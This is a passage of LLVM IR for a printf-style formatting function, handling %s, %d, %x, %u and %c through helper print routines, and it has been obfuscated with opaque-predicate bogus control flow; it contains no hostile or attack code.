; <label>:73:                                     ; preds = %68
  %74 = load i32, i32* @x.7
  %75 = load i32, i32* @y.8
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i8*, i8** %5, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 1
  store i8* %83, i8** %5, align 8
  store i32 1, i32* %8, align 4
  %84 = load i32, i32* @x.7
  %85 = load i32, i32* @y.8
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %92

; <label>:92:                                     ; preds = %originalBBpart28, %68
  %93 = load i32, i32* @x.7
  %94 = load i32, i32* @y.8
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %92
  %101 = load i32, i32* @x.7
  %102 = load i32, i32* @y.8
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %109

; <label>:109:                                    ; preds = %130, %originalBBpart212
  %110 = load i32, i32* @x.7
  %111 = load i32, i32* @y.8
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %109
  %118 = load i8*, i8** %5, align 8
  %119 = load i8, i8* %118, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 48
  %122 = load i32, i32* @x.7
  %123 = load i32, i32* @y.8
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %121, label %130, label %135

; <label>:130:                                    ; preds = %originalBBpart216
  %131 = load i8*, i8** %5, align 8
  %132 = getelementptr inbounds i8, i8* %131, i32 1
  store i8* %132, i8** %5, align 8
  %133 = load i32, i32* %8, align 4
  %134 = or i32 %133, 2
  store i32 %134, i32* %8, align 4
  br label %109

; <label>:135:                                    ; preds = %originalBBpart216
  br label %136

; <label>:136:                                    ; preds = %originalBBpart224, %135
  %137 = load i8*, i8** %5, align 8
  %138 = load i8, i8* %137, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp sge i32 %139, 48
  br i1 %140, label %141, label %162

; <label>:141:                                    ; preds = %136
  %142 = load i32, i32* @x.7
  %143 = load i32, i32* @y.8
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %141
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp sle i32 %152, 57
  %154 = load i32, i32* @x.7
  %155 = load i32, i32* @y.8
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %162

; <label>:162:                                    ; preds = %originalBBpart220, %136
  %163 = phi i1 [ false, %136 ], [ %153, %originalBBpart220 ]
  br i1 %163, label %164, label %192

; <label>:164:                                    ; preds = %162
  %165 = load i32, i32* %7, align 4
  %166 = mul nsw i32 %165, 10
  store i32 %166, i32* %7, align 4
  %167 = load i8*, i8** %5, align 8
  %168 = load i8, i8* %167, align 1
  %169 = zext i8 %168 to i32
  %170 = sub nsw i32 %169, 48
  %171 = load i32, i32* %7, align 4
  %172 = add nsw i32 %171, %170
  store i32 %172, i32* %7, align 4
  br label %173

; <label>:173:                                    ; preds = %164
  %174 = load i32, i32* @x.7
  %175 = load i32, i32* @y.8
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %173
  %182 = load i8*, i8** %5, align 8
  %183 = getelementptr inbounds i8, i8* %182, i32 1
  store i8* %183, i8** %5, align 8
  %184 = load i32, i32* @x.7
  %185 = load i32, i32* @y.8
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %136

; <label>:192:                                    ; preds = %162
  %193 = load i8*, i8** %5, align 8
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 115
  br i1 %196, label %197, label %295

; <label>:197:                                    ; preds = %192
  %198 = load i32, i32* @x.7
  %199 = load i32, i32* @y.8
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %197
  %206 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %207 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %206, i32 0, i32 0
  %208 = load i32, i32* %207, align 8
  %209 = icmp ule i32 %208, 40
  %210 = load i32, i32* @x.7
  %211 = load i32, i32* @y.8
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %209, label %218, label %224

; <label>:218:                                    ; preds = %originalBBpart228
  %219 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %206, i32 0, i32 3
  %220 = load i8*, i8** %219, align 8
  %221 = getelementptr i8, i8* %220, i32 %208
  %222 = bitcast i8* %221 to i32*
  %223 = add i32 %208, 8
  store i32 %223, i32* %207, align 8
  br label %245

; <label>:224:                                    ; preds = %originalBBpart228
  %225 = load i32, i32* @x.7
  %226 = load i32, i32* @y.8
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %224
  %233 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %206, i32 0, i32 2
  %234 = load i8*, i8** %233, align 8
  %235 = bitcast i8* %234 to i32*
  %236 = getelementptr i8, i8* %234, i32 8
  store i8* %236, i8** %233, align 8
  %237 = load i32, i32* @x.7
  %238 = load i32, i32* @y.8
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %245

; <label>:245:                                    ; preds = %originalBBpart232, %218
  %246 = phi i32* [ %222, %218 ], [ %235, %originalBBpart232 ]
  %247 = load i32, i32* @x.7
  %248 = load i32, i32* @y.8
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %245
  %255 = load i32, i32* %246, align 4
  %256 = sext i32 %255 to i64
  %257 = inttoptr i64 %256 to i8*
  store i8* %257, i8** %11, align 8
  %258 = load i8**, i8*** %4, align 8
  %259 = load i8*, i8** %11, align 8
  %260 = icmp ne i8* %259, null
  %261 = load i32, i32* @x.7
  %262 = load i32, i32* @y.8
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %260, label %269, label %271

; <label>:269:                                    ; preds = %originalBBpart236
  %270 = load i8*, i8** %11, align 8
  br label %272

; <label>:271:                                    ; preds = %originalBBpart236
  br label %272

; <label>:272:                                    ; preds = %271, %269
  %273 = phi i8* [ %270, %269 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.423, i32 0, i32 0), %271 ]
  %274 = load i32, i32* @x.7
  %275 = load i32, i32* @y.8
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %272
  %282 = load i32, i32* %7, align 4
  %283 = load i32, i32* %8, align 4
  %284 = call i32 @prints(i8** %258, i8* %273, i32 %282, i32 %283)
  %285 = load i32, i32* %9, align 4
  %286 = add nsw i32 %285, %284
  store i32 %286, i32* %9, align 4
  %287 = load i32, i32* @x.7
  %288 = load i32, i32* @y.8
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBBpart247, label %originalBB38alteredBB

originalBBpart247:                                ; preds = %originalBB38
  br label %571

; <label>:295:                                    ; preds = %192
  %296 = load i8*, i8** %5, align 8
  %297 = load i8, i8* %296, align 1
  %298 = zext i8 %297 to i32
  %299 = icmp eq i32 %298, 100
  br i1 %299, label %300, label %325

; <label>:300:                                    ; preds = %295
  %301 = load i8**, i8*** %4, align 8
  %302 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %303 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %302, i32 0, i32 0
  %304 = load i32, i32* %303, align 8
  %305 = icmp ule i32 %304, 40
  br i1 %305, label %306, label %312

; <label>:306:                                    ; preds = %300
  %307 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %302, i32 0, i32 3
  %308 = load i8*, i8** %307, align 8
  %309 = getelementptr i8, i8* %308, i32 %304
  %310 = bitcast i8* %309 to i32*
  %311 = add i32 %304, 8
  store i32 %311, i32* %303, align 8
  br label %317

; <label>:312:                                    ; preds = %300
  %313 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %302, i32 0, i32 2
  %314 = load i8*, i8** %313, align 8
  %315 = bitcast i8* %314 to i32*
  %316 = getelementptr i8, i8* %314, i32 8
  store i8* %316, i8** %313, align 8
  br label %317

; <label>:317:                                    ; preds = %312, %306
  %318 = phi i32* [ %310, %306 ], [ %315, %312 ]
  %319 = load i32, i32* %318, align 4
  %320 = load i32, i32* %7, align 4
  %321 = load i32, i32* %8, align 4
  %322 = call i32 @printi(i8** %301, i32 %319, i32 10, i32 1, i32 %320, i32 %321, i32 97)
  %323 = load i32, i32* %9, align 4
  %324 = add nsw i32 %323, %322
  store i32 %324, i32* %9, align 4
  br label %571

; <label>:325:                                    ; preds = %295
  %326 = load i8*, i8** %5, align 8
  %327 = load i8, i8* %326, align 1
  %328 = zext i8 %327 to i32
  %329 = icmp eq i32 %328, 120
  br i1 %329, label %330, label %403

; <label>:330:                                    ; preds = %325
  %331 = load i8**, i8*** %4, align 8
  %332 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %333 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %332, i32 0, i32 0
  %334 = load i32, i32* %333, align 8
  %335 = icmp ule i32 %334, 40
  br i1 %335, label %336, label %358

; <label>:336:                                    ; preds = %330
  %337 = load i32, i32* @x.7
  %338 = load i32, i32* @y.8
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %336
  %345 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %332, i32 0, i32 3
  %346 = load i8*, i8** %345, align 8
  %347 = getelementptr i8, i8* %346, i32 %334
  %348 = bitcast i8* %347 to i32*
  %349 = add i32 %334, 8
  store i32 %349, i32* %333, align 8
  %350 = load i32, i32* @x.7
  %351 = load i32, i32* @y.8
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBBpart259, label %originalBB49alteredBB

originalBBpart259:                                ; preds = %originalBB49
  br label %379

; <label>:358:                                    ; preds = %330
  %359 = load i32, i32* @x.7
  %360 = load i32, i32* @y.8
  %361 = sub i32 %359, 1
  %362 = mul i32 %359, %361
  %363 = urem i32 %362, 2
  %364 = icmp eq i32 %363, 0
  %365 = icmp slt i32 %360, 10
  %366 = or i1 %364, %365
  br i1 %366, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %358
  %367 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %332, i32 0, i32 2
  %368 = load i8*, i8** %367, align 8
  %369 = bitcast i8* %368 to i32*
  %370 = getelementptr i8, i8* %368, i32 8
  store i8* %370, i8** %367, align 8
  %371 = load i32, i32* @x.7
  %372 = load i32, i32* @y.8
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %379

; <label>:379:                                    ; preds = %originalBBpart263, %originalBBpart259
  %380 = phi i32* [ %348, %originalBBpart259 ], [ %369, %originalBBpart263 ]
  %381 = load i32, i32* @x.7
  %382 = load i32, i32* @y.8
  %383 = sub i32 %381, 1
  %384 = mul i32 %381, %383
  %385 = urem i32 %384, 2
  %386 = icmp eq i32 %385, 0
  %387 = icmp slt i32 %382, 10
  %388 = or i1 %386, %387
  br i1 %388, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %379
  %389 = load i32, i32* %380, align 4
  %390 = load i32, i32* %7, align 4
  %391 = load i32, i32* %8, align 4
  %392 = call i32 @printi(i8** %331, i32 %389, i32 16, i32 0, i32 %390, i32 %391, i32 97)
  %393 = load i32, i32* %9, align 4
  %394 = add nsw i32 %393, %392
  store i32 %394, i32* %9, align 4
  %395 = load i32, i32* @x.7
  %396 = load i32, i32* @y.8
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBBpart278, label %originalBB65alteredBB

originalBBpart278:                                ; preds = %originalBB65
  br label %571

; <label>:403:                                    ; preds = %325
  %404 = load i8*, i8** %5, align 8
  %405 = load i8, i8* %404, align 1
  %406 = zext i8 %405 to i32
  %407 = icmp eq i32 %406, 88
  br i1 %407, label %408, label %433

; <label>:408:                                    ; preds = %403
  %409 = load i8**, i8*** %4, align 8
  %410 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %411 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %410, i32 0, i32 0
  %412 = load i32, i32* %411, align 8
  %413 = icmp ule i32 %412, 40
  br i1 %413, label %414, label %420

; <label>:414:                                    ; preds = %408
  %415 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %410, i32 0, i32 3
  %416 = load i8*, i8** %415, align 8
  %417 = getelementptr i8, i8* %416, i32 %412
  %418 = bitcast i8* %417 to i32*
  %419 = add i32 %412, 8
  store i32 %419, i32* %411, align 8
  br label %425

; <label>:420:                                    ; preds = %408
  %421 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %410, i32 0, i32 2
  %422 = load i8*, i8** %421, align 8
  %423 = bitcast i8* %422 to i32*
  %424 = getelementptr i8, i8* %422, i32 8
  store i8* %424, i8** %421, align 8
  br label %425

; <label>:425:                                    ; preds = %420, %414
  %426 = phi i32* [ %418, %414 ], [ %423, %420 ]
  %427 = load i32, i32* %426, align 4
  %428 = load i32, i32* %7, align 4
  %429 = load i32, i32* %8, align 4
  %430 = call i32 @printi(i8** %409, i32 %427, i32 16, i32 0, i32 %428, i32 %429, i32 65)
  %431 = load i32, i32* %9, align 4
  %432 = add nsw i32 %431, %430
  store i32 %432, i32* %9, align 4
  br label %571

; <label>:433:                                    ; preds = %403
  %434 = load i8*, i8** %5, align 8
  %435 = load i8, i8* %434, align 1
  %436 = zext i8 %435 to i32
  %437 = icmp eq i32 %436, 117
  br i1 %437, label %438, label %479

; <label>:438:                                    ; preds = %433
  %439 = load i32, i32* @x.7
  %440 = load i32, i32* @y.8
  %441 = sub i32 %439, 1
  %442 = mul i32 %439, %441
  %443 = urem i32 %442, 2
  %444 = icmp eq i32 %443, 0
  %445 = icmp slt i32 %440, 10
  %446 = or i1 %444, %445
  br i1 %446, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %438
  %447 = load i8**, i8*** %4, align 8
  %448 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %449 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %448, i32 0, i32 0
  %450 = load i32, i32* %449, align 8
  %451 = icmp ule i32 %450, 40
  %452 = load i32, i32* @x.7
  %453 = load i32, i32* @y.8
  %454 = sub i32 %452, 1
  %455 = mul i32 %452, %454
  %456 = urem i32 %455, 2
  %457 = icmp eq i32 %456, 0
  %458 = icmp slt i32 %453, 10
  %459 = or i1 %457, %458
  br i1 %459, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br i1 %451, label %460, label %466

; <label>:460:                                    ; preds = %originalBBpart282
  %461 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %448, i32 0, i32 3
  %462 = load i8*, i8** %461, align 8
  %463 = getelementptr i8, i8* %462, i32 %450
  %464 = bitcast i8* %463 to i32*
  %465 = add i32 %450, 8
  store i32 %465, i32* %449, align 8
  br label %471

; <label>:466:                                    ; preds = %originalBBpart282
  %467 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %448, i32 0, i32 2
  %468 = load i8*, i8** %467, align 8
  %469 = bitcast i8* %468 to i32*
  %470 = getelementptr i8, i8* %468, i32 8
  store i8* %470, i8** %467, align 8
  br label %471

; <label>:471:                                    ; preds = %466, %460
  %472 = phi i32* [ %464, %460 ], [ %469, %466 ]
  %473 = load i32, i32* %472, align 4
  %474 = load i32, i32* %7, align 4
  %475 = load i32, i32* %8, align 4
  %476 = call i32 @printi(i8** %447, i32 %473, i32 10, i32 0, i32 %474, i32 %475, i32 97)
  %477 = load i32, i32* %9, align 4
  %478 = add nsw i32 %477, %476
  store i32 %478, i32* %9, align 4
  br label %571

; <label>:479:                                    ; preds = %433
  %480 = load i8*, i8** %5, align 8
  %481 = load i8, i8* %480, align 1
  %482 = zext i8 %481 to i32
  %483 = icmp eq i32 %482, 99
  br i1 %483, label %484, label %529

; <label>:484:                                    ; preds = %479
  %485 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %486 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %485, i32 0, i32 0
  %487 = load i32, i32* %486, align 8
  %488 = icmp ule i32 %487, 40
  br i1 %488, label %489, label %511

; <label>:489:                                    ; preds = %484
  %490 = load i32, i32* @x.7
  %491 = load i32, i32* @y.8
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %489
  %498 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %485, i32 0, i32 3
  %499 = load i8*, i8** %498, align 8
  %500 = getelementptr i8, i8* %499, i32 %487
  %501 = bitcast i8* %500 to i32*
  %502 = add i32 %487, 8
  store i32 %502, i32* %486, align 8
  %503 = load i32, i32* @x.7
  %504 = load i32, i32* @y.8
  %505 = sub i32 %503, 1
  %506 = mul i32 %503, %505
  %507 = urem i32 %506, 2
  %508 = icmp eq i32 %507, 0
  %509 = icmp slt i32 %504, 10
  %510 = or i1 %508, %509
  br i1 %510, label %originalBBpart294, label %originalBB84alteredBB

originalBBpart294:                                ; preds = %originalBB84
  br label %516

; <label>:511:                                    ; preds = %484
  %512 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %485, i32 0, i32 2
  %513 = load i8*, i8** %512, align 8
  %514 = bitcast i8* %513 to i32*
  %515 = getelementptr i8, i8* %513, i32 8
  store i8* %515, i8** %512, align 8
  br label %516

; <label>:516:                                    ; preds = %511, %originalBBpart294
  %517 = phi i32* [ %501, %originalBBpart294 ], [ %514, %511 ]
  %518 = load i32, i32* %517, align 4
  %519 = trunc i32 %518 to i8
  %520 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %519, i8* %520, align 1
  %521 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %521, align 1
  %522 = load i8**, i8*** %4, align 8
  %523 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %524 = load i32, i32* %7, align 4
  %525 = load i32, i32* %8, align 4
  %526 = call i32 @prints(i8** %522, i8* %523, i32 %524, i32 %525)
  %527 = load i32, i32* %9, align 4
  %528 = add nsw i32 %527, %526
  store i32 %528, i32* %9, align 4
  br label %571

; <label>:529:                                    ; preds = %479
  %530 = load i32, i32* @x.7
  %531 = load i32, i32* @y.8
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %529
  %538 = load i32, i32* @x.7
  %539 = load i32, i32* @y.8
  %540 = sub i32 %538, 1
  %541 = mul i32 %538, %540
  %542 = urem i32 %541, 2
  %543 = icmp eq i32 %542, 0
  %544 = icmp slt i32 %539, 10
  %545 = or i1 %543, %544
  br i1 %545, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br label %570

; <label>:546:                                    ; preds = %17
  br label %547

; <label>:547:                                    ; preds = %546, %67
  %548 = load i32, i32* @x.7
  %549 = load i32, i32* @y.8
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %547
  %556 = load i8**, i8*** %4, align 8
  %557 = load i8*, i8** %5, align 8
  %558 = load i8, i8* %557, align 1
  %559 = zext i8 %558 to i32
  call void @printchar(i8** %556, i32 %559)
  %560 = load i32, i32* %9, align 4
  %561 = add nsw i32 %560, 1
  store i32 %561, i32* %9, align 4
  %562 = load i32, i32* @x.7
  %563 = load i32, i32* @y.8
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBBpart2114, label %originalBB100alteredBB

originalBBpart2114:                               ; preds = %originalBB100
  br label %570

; <label>:570:                                    ; preds = %originalBBpart2114, %originalBBpart298
  br label %571

; <label>:571:                                    ; preds = %570, %516, %471, %425, %originalBBpart278, %317, %originalBBpart247
  %572 = load i8*, i8** %5, align 8
  %573 = getelementptr inbounds i8, i8* %572, i32 1
  store i8* %573, i8** %5, align 8
  br label %12

; <label>:574:                                    ; preds = %originalBBpart2, %12
  %575 = load i8**, i8*** %4, align 8
  %576 = icmp ne i8** %575, null
  br i1 %576, label %577, label %596

; <label>:577:                                    ; preds = %574
  %578 = load i32, i32* @x.7
  %579 = load i32, i32* @y.8
  %580 = sub i32 %578, 1
  %581 = mul i32 %578, %580
  %582 = urem i32 %581, 2
  %583 = icmp eq i32 %582, 0
  %584 = icmp slt i32 %579, 10
  %585 = or i1 %583, %584
  br i1 %585, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %577
  %586 = load i8**, i8*** %4, align 8
  %587 = load i8*, i8** %586, align 8
  store i8 0, i8* %587, align 1
  %588 = load i32, i32* @x.7
  %589 = load i32, i32* @y.8
  %590 = sub i32 %588, 1
  %591 = mul i32 %588, %590
  %592 = urem i32 %591, 2
  %593 = icmp eq i32 %592, 0
  %594 = icmp slt i32 %589, 10
  %595 = or i1 %593, %594
  br i1 %595, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br label %596

; <label>:596:                                    ; preds = %originalBBpart2118, %574
  %597 = load i32, i32* @x.7
  %598 = load i32, i32* @y.8
  %599 = sub i32 %597, 1
  %600 = mul i32 %597, %599
  %601 = urem i32 %600, 2
  %602 = icmp eq i32 %601, 0
  %603 = icmp slt i32 %598, 10
  %604 = or i1 %602, %603
  br i1 %604, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %596
  %605 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %606 = bitcast %struct.__va_list_tag* %605 to i8*
  call void @llvm.va_end(i8* %606)
  %607 = load i32, i32* %9, align 4
  %608 = load i32, i32* @x.7
  %609 = load i32, i32* @y.8
  %610 = sub i32 %608, 1
  %611 = mul i32 %608, %610
  %612 = urem i32 %611, 2
  %613 = icmp eq i32 %612, 0
  %614 = icmp slt i32 %609, 10
  %615 = or i1 %613, %614
  br i1 %615, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  ret i32 %607

originalBBalteredBB:                              ; preds = %originalBB, %29
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %616 = load i8*, i8** %5, align 8
  %617 = load i8, i8* %616, align 1
  %618 = zext i8 %617 to i32
  %619 = icmp eq i32 %618, 37
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  %620 = load i8*, i8** %5, align 8
  %621 = getelementptr inbounds i8, i8* %620, i32 1
  store i8* %621, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %92
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %109
  %622 = load i8*, i8** %5, align 8
  %623 = load i8, i8* %622, align 1
  %624 = zext i8 %623 to i32
  %625 = icmp eq i32 %624, 48
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %141
  %626 = load i8*, i8** %5, align 8
  %627 = load i8, i8* %626, align 1
  %628 = zext i8 %627 to i32
  %629 = icmp sle i32 %628, 57
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %173
  %630 = load i8*, i8** %5, align 8
  %631 = getelementptr inbounds i8, i8* %630, i32 1
  store i8* %631, i8** %5, align 8
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %197
  %632 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %633 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %632, i32 0, i32 0
  %634 = load i32, i32* %633, align 8
  %635 = icmp ule i32 %634, 40
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %224
